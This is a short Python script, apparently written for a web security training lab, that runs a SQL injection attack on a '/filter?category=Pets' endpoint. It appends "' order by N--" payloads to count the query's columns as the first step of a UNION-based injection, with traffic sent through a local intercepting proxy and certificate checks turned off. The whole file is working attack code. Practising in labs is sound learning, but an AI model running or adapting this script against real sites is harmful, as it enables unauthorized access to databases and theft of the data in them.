import urllib3
import requests
import sys
 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def no_of_columns(url):
    path = "/filter?category=Pets"
    orderbyIncrement = 1;
    columnNumber = 1

    while orderbyIncrement != 0:
        res = requests.get(url + path + "' order by " + str(orderbyIncrement) + "--", verify = False, proxies = proxies)
        # print (res.status_code)
        # print (orderbyIncrement)

        if(res.status_code == 200):
            columnNumber = orderbyIncrement
            orderbyIncrement = orderbyIncrement + 1
        else:
            orderbyIncrement = 0

    if columnNumber != 0:
        return columnNumber   
    else: 
        return 0
    
proxies = {
    'http' : 'http://127.0.0.1:8080',
    'https' : 'http://127.0.0.1:8080'
}

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError: 
        print("[-] %s Invalid input" %sys.argv[0])
        sys.exit(-1)
    
    columnNumbers = no_of_columns(url)

    if columnNumbers == 0:
        print("[-] SQLi failed")
    else:
        print("[+] no of columns is: %s" %columnNumbers)